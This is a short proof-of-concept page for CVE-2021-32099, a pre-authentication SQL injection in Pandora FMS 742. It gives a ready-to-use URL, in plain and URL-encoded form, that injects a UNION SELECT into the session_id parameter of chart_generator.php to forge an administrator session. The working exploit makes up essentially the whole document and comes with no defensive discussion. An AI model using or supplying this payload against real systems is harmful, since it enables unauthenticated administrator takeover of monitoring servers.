# CVE-2021-32099

## pandora fms 742 sqli (pre authentication) POC
```
http://localhost/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1
```

`URL Encoded`
```
http://localhost/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
```
